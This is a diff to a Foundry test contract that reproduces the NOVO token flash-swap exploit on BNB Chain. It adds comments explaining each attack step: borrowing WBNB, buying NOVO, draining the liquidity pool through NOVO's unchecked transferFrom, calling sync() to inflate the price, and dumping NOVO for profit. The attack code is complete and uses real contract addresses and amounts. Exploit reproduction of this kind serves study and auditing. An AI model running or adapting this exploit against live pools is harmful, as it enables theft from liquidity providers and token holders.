@@ -30,10 +30,15 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
+        // EXPLOIT STEP 0 (setup): Seed attacker with 10 WBNB to pay flash-swap fee + gas. This is the attacker's initial capital.
         wbnb.deposit{value: 10 * 1e18}();
         emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit", wbnb.balanceOf(address(this)), 18);
 
-        // Brrow 17.2 WBNB
+        // EXPLOIT STEP 1: Initiate flash-swap to borrow 17.2 WBNB from the NOVO/WBNB PancakePair (token1).
+        // The pair will call back into pancakeCall on this contract with the borrowed WBNB.
+        // Why it works: PancakePair implements the standard UniswapV2 flash-swap pattern (no reentrancy guard on callback for this flow).
+        // Data encodes the pair and amount (for illustration); actual amounts use constants inside callback.
+        // This gives the attacker WBNB with 0 upfront capital for the main body of the attack.
         bytes memory data = abi.encode(0xEeBc161437FA948AAb99383142564160c92D2974, 172 * 1e17);
         PancakePair.swap(0, 172 * 1e17, address(this), data);
 
@@ -41,6 +46,9 @@ contract ContractTest is Test {
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
+        // EXPLOIT STEP 2: (inside flash-swap callback) Use the borrowed WBNB to buy NOVO on PancakeRouter.
+        // This acquires a large position in NOVO at the *current* (fair) market price.
+        // The buy pulls NOVO out of the same LP pair (via router), but this is only to establish the attacker's inventory.
         // 攻擊者先買入 NOVO Token
         // 透過 NOVO Token 的 transferFrom 未過濾 `from`
         // `from` 指定為 NOVO/WBNB 的 LP pool, 即可操縱 PancakeSwap NOVO/WBNB 的價格
@@ -50,6 +58,7 @@ contract ContractTest is Test {
 
         emit log_named_decimal_uint("[*] Attacker flashswap Borrow WBNB", amount1, 18);
 
+        // EXPLOIT STEP 2 continued: Approve and perform the WBNB->NOVO swap to acquire ~4.7T NOVO (9 decimals).
         // Use borrow WBNB to swap some NOVO token
         emit log_string("[*] Attacker going swap some NOVO...");
         wbnb.approve(address(PancakeRouter), type(uint256).max);
@@ -60,18 +69,31 @@ contract ContractTest is Test {
         ); // get 4,749,070,146,640,911 NOVO Token
         require(novo.balanceOf(address(this)) != 0, "Swap Failed");
 
+        // EXPLOIT STEP 3: Snapshot pre-manipulation balances. LP currently holds the bulk of the circulating NOVO as its reserve.
         // Sync NOVO token balance before exploit
         emit log_named_decimal_uint("\t[INFO] Attacker NOVO balance", novo.balanceOf(address(this)), 9);
         emit log_named_decimal_uint("\t[INFO] PancakeSwap NOVO/WBNB LP balance", novo.balanceOf(address(novoLP)), 9);
 
+        // EXPLOIT STEP 4: CORE EXPLOIT - Drain ~114T NOVO (almost the entire LP balance) from the Pancake LP
+        // directly into the NOVO token contract using the broken transferFrom.
+        // Because transferFrom on NOVO ignores `msg.sender` and allowance (see VULNERABILITY in NOVO.sol:2939),
+        // this call succeeds even though the attacker has zero allowance from the LP.
+        // The tokens leave the LP's balanceOf, but do not go to the attacker (sent to token addr to avoid side-effects).
         // Manipulate the LP of NOVO/WBNB => Manipulate the NOVO/WBNB price
         emit log_string("[E] Attacker going manipulate NOVO/WBNB LP...");
         novo.transferFrom(address(novoLP), address(novo), 113_951_614_762_384_370); // 113,951,614.76238437 NOVO Token
         emit log_named_decimal_uint("\t[INFO] PancakeSwap NOVO/WBNB LP balance", novo.balanceOf(address(novoLP)), 9);
 
+        // EXPLOIT STEP 5: Force the pair to recompute its internal reserves from *actual* balances.
+        // novoLP.sync() calls _update(balance0, balance1, ...) which sets reserve0 = near-zero.
+        // This instantly makes the implied price (reserve1/reserve0) of NOVO extremely high (~100x).
+        // No swap fee or liquidity math is applied during this drain+sync; the invariant is broken deliberately.
         // Sync NOVO/WBNB price
         novoLP.sync();
 
+        // EXPLOIT STEP 6: Dump the attacker's entire NOVO inventory into the now-skewed pool for WBNB.
+        // Because price of NOVO (in WBNB terms) is massively inflated, a "normal" amount of NOVO yields
+        // far more WBNB than it cost to acquire in STEP 2. Profit is the difference (after repay).
         // Swap NOVO to WBNB, make attacker profit
         emit log_string("[*] Attacker going swap some WBNB...");
         novo.approve(address(PancakePair), novo.balanceOf(address(this)));
@@ -82,6 +104,8 @@ contract ContractTest is Test {
         );
         require(wbnb.balanceOf(address(this)) > 172 * 1e17, "Exploit Failed");
 
+        // EXPLOIT STEP 7: Repay the flash-swap principal + 0.25% fee (Pancake V2 fee).
+        // The excess WBNB (profit) remains in the attacker's balance.
         // Payback the flashswap, will be `BorrowAmount` + 0.25% fee
         require(wbnb.transfer(address(PancakePair), amount1 + 4472 * 10e13), "Payback Failed");
     }
